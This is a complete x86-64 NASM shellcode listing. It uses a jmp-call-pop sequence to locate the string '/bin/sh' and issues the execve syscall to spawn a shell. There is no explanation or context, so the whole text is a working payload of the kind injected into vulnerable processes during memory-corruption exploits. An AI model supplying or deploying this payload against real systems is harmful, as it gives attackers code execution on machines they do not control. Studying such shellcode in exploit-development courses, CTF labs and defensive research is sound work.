BITS 64
xor rdx, rdx
push rdx
jmp short arg0
fir:
pop rdi
push rdi
mov rsi, rsp
xor rax, rax
mov al, 59
syscall
arg0:
call near fir
db "/bin/sh"
db 0

